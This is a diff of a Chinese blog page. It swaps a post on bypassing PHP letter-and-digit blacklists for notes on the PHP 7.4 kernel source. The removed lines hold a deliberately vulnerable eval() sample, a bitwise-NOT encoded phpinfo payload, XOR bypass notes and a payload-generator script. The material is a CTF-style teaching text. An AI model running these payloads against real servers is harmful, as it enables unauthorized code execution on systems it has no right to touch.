@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="php-rce," />
+  <meta name="keywords" content="php74-kernel," />
 
 
 
@@ -81,17 +81,17 @@
 
 
 
-<meta name="description" content="没有blacklist的rce是没有灵魂的！">
+<meta name="description" content="《深入理解php内核》笔记。这个系列将会对php7.4.30版本的部分源码进行分析。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="无字母数字RCE初探">
-<meta property="og:url" content="https://www.m0x01sery.com/2022/03/28/rce_without_w_and_n/index.html">
+<meta property="og:title" content="php74内核源码阅读——开始之前">
+<meta property="og:url" content="https://www.m0x01sery.com/2022/11/01/php74k1/index.html">
 <meta property="og:site_name" content="M1seryの厨房">
-<meta property="og:description" content="没有blacklist的rce是没有灵魂的！">
+<meta property="og:description" content="《深入理解php内核》笔记。这个系列将会对php7.4.30版本的部分源码进行分析。">
 <meta property="og:locale">
-<meta property="article:published_time" content="2022-03-27T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-03-31T16:00:00.000Z">
+<meta property="article:published_time" content="2022-10-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-31T16:00:00.000Z">
 <meta property="article:author" content="M1sery">
-<meta property="article:tag" content="php-rce">
+<meta property="article:tag" content="php74-kernel">
 <meta name="twitter:card" content="summary">
 
 
@@ -122,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://www.m0x01sery.com/2022/03/28/rce_without_w_and_n/"/>
+  <link rel="canonical" href="https://www.m0x01sery.com/2022/11/01/php74k1/"/>
 
 
 
 
 
-  <title>无字母数字RCE初探 | M1seryの厨房</title>
+  <title>php74内核源码阅读——开始之前 | M1seryの厨房</title>
   
 
 
@@ -279,7 +279,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.m0x01sery.com/2022/03/28/rce_without_w_and_n/">
+    <link itemprop="mainEntityOfPage" href="https://www.m0x01sery.com/2022/11/01/php74k1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M1sery">
@@ -296,7 +296,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">无字母数字RCE初探</h2>
+          <h2 class="post-title" itemprop="name headline">php74内核源码阅读——开始之前</h2>
         
 
         <div class="post-meta">
@@ -308,8 +308,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-03-28T00:00:00+08:00">
-                2022-03-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-01T00:00:00+08:00">
+                2022-11-01
               </time>
             
 
@@ -324,8 +324,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2022-04-01T00:00:00+08:00">
-                2022-04-01
+              <time title="更新于" itemprop="dateModified" datetime="2022-11-01T00:00:00+08:00">
+                2022-11-01
               </time>
             
           </span>
@@ -358,63 +358,62 @@
       
 
       
-        <p>没有blacklist的rce是没有灵魂的！</p>
+        <p>《深入理解php内核》笔记。这个系列将会对php7.4.30版本的部分源码进行分析。</p>
 <span id="more"></span>
 
-<p>有人说，说是有人在blacklist里下了毒（指<code>/[a-zA-Z0-9]+/</code></p>
-<p>害羞羞，你看你就会开玩笑（指绕过</p>
-<p>本地写个青春版</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+<h1><span id="环境搭建">环境搭建</span></h1><p>本地编译出的php会留下符号表，后期调试时可以进行源码级别的调试，会方便很多。</p>
+<p>以本机的php-7.4.30为例，在github上可以获取对应版本的源码<sup>[1]</sup>。执行代码根目录的buildconf脚本以生成所需要的构建脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&gt; cd ~/php-src</span><br><span class="line">$&gt; ./buildconf</span><br></pre></td></tr></table></figure>
 
-<h1><span id="取反">取反</span></h1><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p>
-<p>举个栗子</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(~<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(-234)</span></span><br></pre></td></tr></table></figure>
+<p>执行完以后就可以开始执行configure了，通过 <strong>--disable-all</strong> 选项编译一个最精简的php。如果configure脚本出现错误，可能是缺少php所依赖的库，各个系统的环境可能不一样，缺啥下啥就好。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&gt; ./configure --disable-all</span><br><span class="line">$&gt; make</span><br></pre></td></tr></table></figure>
 
-<p><code>233</code>的二进制值为<code>0000 0000 1110 1001</code></p>
-<p>按位取反得<code>1111 1111 0001 0110</code>，即<code>-234</code>。</p>
-<p>ps：我们可能更熟悉长成<code>1000 0000 1110 1010</code>的<code>-234</code>，其实它们是等价的，只是表示方法不同。前者是补码形式，后者是原码形式，最高位都为符号位。关于<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ydqblogs/p/13823206.html">原码，反码，补码</a></p>
-<p>那么对于字母而言，我们也就能通过其他字符加上取反操作得到我们想到的组合了。</p>
-<p>大部分情况下都会加上<code>urlencode()</code>，出现乱码总是很老火的说</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span></span><br></pre></td></tr></table></figure>
+<p>make执行完以后，在sapi/cli目录里就已经有了php的可执行文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&gt; ./sapi/cli/php -v</span><br><span class="line">php 7.4.30 (cli) (built: Oct  5 2022 17:29:46) ( NTS )</span><br><span class="line">Copyright (c) The php Group</span><br><span class="line">Zend Engine v3.4.0, Copyright (c) Zend Technologies</span><br></pre></td></tr></table></figure>
 
-<p>最终payload为<code>(%8F%97%8F%96%91%99%90)();</code>。</p>
-<p>相信不止我一个人在刚接触这种姿势时认为，将<code>phpinfo();</code>这完整的函数进行取反不是能减少一些操作嘛，为什么要单独取反函数名再加上括号和分号呢？</p>
-<p>让我们把这段代码再回下锅</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+<h1><span id="主要目录结构">主要目录结构</span></h1><ul>
+<li><p>build -- 和编译有关的目录。主要放置一些和源码编译相关的一些文件，还有一些检查环境的脚本等，里面包括wk，awk和sh脚本用于编译处理，其中m4文件是linux下编译程序自动生成的文件，可以使用buildconf命令操作具体的配置文件。</p>
+</li>
+<li><p>ext -- 官方扩展目录，包括了绝大多数php的函数的定义和实现，如<code>array</code>系列，<code>pdo</code>系列，<code>spl</code>系列等函数的实现，个人写的扩展在测试时也可以放到这个目录，方便测试和调试。ext_skel.php为扩展项目生成脚本。</p>
+</li>
+<li><p>main -- 主目录，存放php最为核心的文件，包含php的主要宏定义文件，其中 php.h 包含绝大部分php宏及 phpAPI 定义。</p>
+</li>
+<li><p>pear -- php扩展与应用库。代码由php实现，逐渐被 composer 取代。</p>
+</li>
+<li><p>sapi -- 包含了各种服务器抽象层的代码，例如apache的mod_php，cgi，fastcgi以及fpm等等接口。</p>
+</li>
+<li><p>scripts -- linux下的脚本目录。</p>
+</li>
+<li><p>tests -- 测试脚本目录，主要是 phpt 脚本。</p>
+</li>
+<li><p>TSRM -- 线程安全资源管理器，保证在单线程和多线程模型下的线程安全和代码一致性。</p>
+</li>
+<li><p>win32 -- 这个目录主要包括Windows平台相关的一些实现，比如sokcet的实现在Windows下和*Nix平台就不太一样。</p>
+</li>
+<li><p>Zend -- 包含Zend引擎的所有文件，包括php的生命周期，内存管理，变量定义和赋值以及函数宏定义等等。</p>
+</li>
+</ul>
+<h1><span id="php全局变量宏">php全局变量宏</span></h1><p>php运行时的一些全局变量为存放在mian文件夹下php_globals.h头文件中的一个结构体里。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">php_core_globals</span> &#123;</span></span><br><span class="line">    zend_bool implicit_flush; <span class="comment">// 是否要求php输出层在每个输出块之后自动刷新数据</span></span><br><span class="line"></span><br><span class="line">    zend_long output_buffering; <span class="comment">// 输出缓冲区大小</span></span><br><span class="line"></span><br><span class="line">    zend_bool enable_dl; <span class="comment">// 是否允许使用dl()函数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *output_handler; <span class="comment">// 将所有脚本的输出重定向到一个输出处理函数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *unserialize_callback_func; <span class="comment">// 如果反序列化处理器需要实例化一个未定义的类，指定的回调函数将以该未定义类的名字作为参数被unserialize()调用</span></span><br><span class="line">    zend_long serialize_precision;   <span class="comment">// 将浮点型和双精度型数据序列化存储时的精度（即有效位数）</span></span><br><span class="line"></span><br><span class="line">    zend_long memory_limit;   <span class="comment">// 一个脚本所能申请到的最大内存字节数</span></span><br><span class="line">    zend_long max_input_time; <span class="comment">// 每个脚本解析输入数据（POST, GET, upload）的最大允许时间</span></span><br><span class="line"></span><br><span class="line">    zend_bool track_errors;           <span class="comment">// 是否在变量$php_errormsg中保存最近一个错误或警告消息</span></span><br><span class="line">    zend_bool display_errors;         <span class="comment">// 是否将错误信息作为输出的一部分显示</span></span><br><span class="line">    zend_bool display_startup_errors; <span class="comment">// 是否显示php启动时的错误</span></span><br><span class="line">    zend_bool log_errors;             <span class="comment">// 是否在日志文件里记录错误</span></span><br><span class="line">    zend_long log_errors_max_len;     <span class="comment">// 设置错误日志中附加的与错误信息相关联的错误源的最大长度</span></span><br><span class="line">    zend_bool ignore_repeated_errors; <span class="comment">// 记录错误日志时是否忽略重复的错误信息</span></span><br><span class="line">    zend_bool ignore_repeated_source; <span class="comment">// 记录错误日志时是否忽略重复的错误源</span></span><br><span class="line">    zend_bool report_memleaks;        <span class="comment">// 是否报告内存泄漏</span></span><br><span class="line">    <span class="type">char</span> *error_log;                  <span class="comment">// 将错误日志记录到具体哪个文件中</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *doc_root;      <span class="comment">// php的“根目录”</span></span><br><span class="line">    <span class="type">char</span> *user_dir;      <span class="comment">// 告诉php使用/~username打开脚本时到哪个目录下去找</span></span><br><span class="line">    <span class="type">char</span> *include_path;  <span class="comment">// require()，include()，fopen_with_path()函数寻找文件的目录</span></span><br><span class="line">    <span class="type">char</span> *open_basedir;  <span class="comment">// 将php允许操作的所有文件都限制在此组目录列表下</span></span><br><span class="line">    <span class="type">char</span> *extension_dir; <span class="comment">// 存放扩展库（模块）的目录</span></span><br><span class="line">    <span class="type">char</span> *php_binary;</span><br><span class="line">    <span class="type">char</span> *sys_temp_dir;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *upload_tmp_dir;          <span class="comment">// 文件上传时存放文件的临时目录</span></span><br><span class="line">    zend_long upload_max_filesize; <span class="comment">// 允许上传的文件的最大大小</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *error_append_string;  <span class="comment">// 错误信息后输出的字符串</span></span><br><span class="line">    <span class="type">char</span> *error_prepend_string; <span class="comment">// 错误信息前输出的字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *auto_prepend_file; <span class="comment">// 指定在php文件解析之前自动解析的文件</span></span><br><span class="line">    <span class="type">char</span> *auto_append_file;  <span class="comment">// 指定在php文件解析之后自动解析的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *input_encoding;</span><br><span class="line">    <span class="type">char</span> *internal_encoding;</span><br><span class="line">    <span class="type">char</span> *output_encoding;</span><br><span class="line"></span><br><span class="line">    arg_separators arg_separator; <span class="comment">// php产生的URL中用来分隔参数的分隔符</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *variables_order; <span class="comment">// php注册Environment，GET，POST，Cookie，Server变量的顺序</span></span><br><span class="line"></span><br><span class="line">    HashTable rfc1867_protected_variables; <span class="comment">// RFC1867保护的变量名，在main/rfc1867.c文件中有用到此变量</span></span><br><span class="line"></span><br><span class="line">    <span class="type">short</span> connection_status;     <span class="comment">// 三个连接状态，分别为正常，中断，超时</span></span><br><span class="line">    zend_bool ignore_user_abort; <span class="comment">// 是否即使在用户中止请求后也坚持完成整个请求</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> header_is_being_sent; <span class="comment">// 是否正在发送头部信息</span></span><br><span class="line"></span><br><span class="line">    zend_llist tick_functions; <span class="comment">// 仅在main目录下的php_ticks.c文件中有用到</span></span><br><span class="line"></span><br><span class="line">    zval http_globals[<span class="number">6</span>]; <span class="comment">// 存放GET、POST、SERVER等信息</span></span><br><span class="line"></span><br><span class="line">    zend_bool expose_php; <span class="comment">// 是否展示php的信息</span></span><br><span class="line"></span><br><span class="line">    zend_bool register_argc_argv; <span class="comment">// 是否声明$argv和$argc全局变量（包含用GET方法的信息）</span></span><br><span class="line">    zend_bool auto_globals_jit;   <span class="comment">// 是否仅在用到$_SERVER和$_ENV变量时才创建全局变量（而不是在脚本一启动时就自动创建）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *docref_root; <span class="comment">// 如果打开了html_errors指令，php将会在出错信息上显示超连接</span></span><br><span class="line">    <span class="type">char</span> *docref_ext;  <span class="comment">// 指定文件的扩展名</span></span><br><span class="line"></span><br><span class="line">    zend_bool html_errors; <span class="comment">// 是否在出错信息中使用HTML标记</span></span><br><span class="line">    zend_bool xmlrpc_errors;</span><br><span class="line"></span><br><span class="line">    zend_long xmlrpc_error_number;</span><br><span class="line"></span><br><span class="line">    zend_bool activated_auto_globals[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    zend_bool modules_activated;             <span class="comment">// 是否已经激活模块</span></span><br><span class="line">    zend_bool file_uploads;                  <span class="comment">// 是否允许HTTP文件上传</span></span><br><span class="line">    zend_bool during_request_startup;        <span class="comment">// 是否在请求初始化过程中</span></span><br><span class="line">    zend_bool allow_url_fopen;               <span class="comment">// 是否允许打开远程文件</span></span><br><span class="line">    zend_bool always_populate_raw_post_data; <span class="comment">// 是否总是生成$HTTP_RAW_POST_DATA变量（原始POST数据）</span></span><br><span class="line">    zend_bool report_zend_debug;             <span class="comment">// 是否打开zend debug，仅在main/main.c文件中有使用</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> last_error_type;      <span class="comment">// 最后的错误类型</span></span><br><span class="line">    <span class="type">char</span> *last_error_message; <span class="comment">// 最后的错误信息</span></span><br><span class="line">    <span class="type">char</span> *last_error_file;    <span class="comment">// 最后的错误文件</span></span><br><span class="line">    <span class="type">int</span> last_error_lineno;    <span class="comment">// 最后的错误行</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *php_sys_temp_dir;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *disable_functions;     <span class="comment">// 接受一个用逗号分隔的函数名列表，以禁用特定的函数</span></span><br><span class="line">    <span class="type">char</span> *disable_classes;       <span class="comment">// 接受一个用逗号分隔的类名列表，以禁用特定的类</span></span><br><span class="line">    zend_bool allow_url_include; <span class="comment">// 是否允许include/require远程文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PHP_WIN32</span></span><br><span class="line">    zend_bool com_initialized;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    zend_long max_input_nesting_level; <span class="comment">// 最大的嵌套层数</span></span><br><span class="line">    zend_long max_input_vars;</span><br><span class="line">    zend_bool in_user_include;         <span class="comment">// 是否处于用户包含空间</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *user_ini_filename;      <span class="comment">// 用户的ini文件名</span></span><br><span class="line">    zend_long user_ini_cache_ttl; <span class="comment">// ini缓存过期限制</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *request_order; <span class="comment">// 优先级比variables_order高，在request变量生成时用到，可能是历史遗留问题</span></span><br><span class="line"></span><br><span class="line">    zend_bool mail_x_header; <span class="comment">// 仅在ext/standard/mail.c文件中使用</span></span><br><span class="line">    <span class="type">char</span> *mail_log;</span><br><span class="line"></span><br><span class="line">    zend_bool in_error_log;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PHP_WIN32</span></span><br><span class="line">    zend_bool windows_show_crt_warning;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    zend_long syslog_facility;</span><br><span class="line">    <span class="type">char</span> *syslog_ident;</span><br><span class="line">    zend_bool have_called_openlog;</span><br><span class="line">    zend_long syslog_filter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p><code>eval()</code>首先执行的操作是取反<code>~</code>，而取反后的最终结果只会是单纯的字符串。得出<code>phpinfo</code>后，如果再加上外部的括号，得到的实际上是<code>(&#39;phpinfo&#39;)()</code>，经过<code>eval()</code>的解析，在php7及以上版本中这种写法会被认为是函数，因此会执行后续的payload。分号作为一句完整代码的结束标志，就和平时写代码一样。</p>
-<p>我们将括号分号一齐加入取反的队伍，取反后得到了<code>phpinfo();</code>，看似没有多大差别，但我们要知道，这是一串字符串，只是一串字符串。<code>eval()</code>对单纯的字符串又有什么坏心思呢？于是就没有后续了。（悲</p>
-<p>试着写了个很挫的脚本 学习为主 轻喷（demo版 后面会继续升级的 这还不够智能 瘫</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn($func1 [, $func2] [, $param])</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;ini_get&#x27;</span>, <span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$func1</span>, <span class="variable">$func2</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$param</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$negat_func1</span> = ~<span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)());&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$negat_param</span> = ~<span class="variable">$param</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;)));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面的字段很大一部分是与php.ini文件中的配置项对应的。 php启动并读取php.ini文件时就会对这些字段进行赋值，用户空间的<code>ini_get()</code>及<code>ini_set()</code>函数操作的一些配置也在是对这个全局变量进行操作。</p>
+<h1><span id="sapi接口">SAPI接口</span></h1><p>SAPI（Server Application Programming Interface）指的是php具体应用的编程接口。php脚本要执行有很多种方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。虽然通过Web服务器和命令行程序执行脚本看起来很不一样，实际上它们的工作流程是一样的，命令行参数传递给php解释器要执行的脚本，相当于通过url请求一个php页面。脚本执行完成后返回响应结果，只不过命令行的响应结果是显示在终端上。</p>
+<h1><span id="php生命周期">php生命周期</span></h1><p>php在接收到 SAPI 命令时，首先初始化并启动它的内核子系统，在内核子系统的启动快结束时，php开始加载它的扩展代码并对扩展初始化，此时php将调用每个模块的初始化例程，即MINIT。</p>
+<p><strong>Module init (MINIT):</strong></p>
+<p>php解释器启动，加载相关模块，在此时调用相关模块的MINIT方法，仅被调用一次。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_MINIT_FUNCTION(myphpextension)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 注册常量或者类等初始化操作</span></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h1><span id="异或">异或</span></h1><p>万恶之源 我很异或（疑惑）的出处</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">1</span>;  <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">0</span>;  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">0</span>^<span class="number">0</span>;  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
+<p><strong>Request init (RINIT):</strong></p>
+<p>在模块初始化完成后，php等待来自SAPI的请求，当接收到SAPI请求后，SAPI层将控制权交由php层，php初始化本次请求执行脚本所需的环境变量，函数列表等，并调用所有模块的RINIT函数，使得每个扩展有机会设定特定的环境变量，根据请求分配资源，或者执行其他任务。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php_RINIT_FUNCTION(myphpextension)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 例如记录请求开始时间</span></span><br><span class="line">    <span class="comment">// 随后在请求结束的时候记录结束时间。这样我们就能够记录下处理请求所花费的时间了</span></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>在php中两个字符串异或之后，得到的还是一个字符串。基于此我们也能做到无字母数字构造payload。</p>
-<p>选择异或的理由？同或不行吗？当然可以!</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>|<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># c</span></span><br></pre></td></tr></table></figure>
+<p><strong>Request shutdown (RSHUTDOWN):</strong></p>
+<p>请求结束，php就会自动清理程序，顺序调用各个模块的RSHUTDOWN函数以执行最后的清理工作（如将session变量存入磁盘），接着执行垃圾收集，有效地对之前的请求期间用到的每个变量执行unset()。</p>
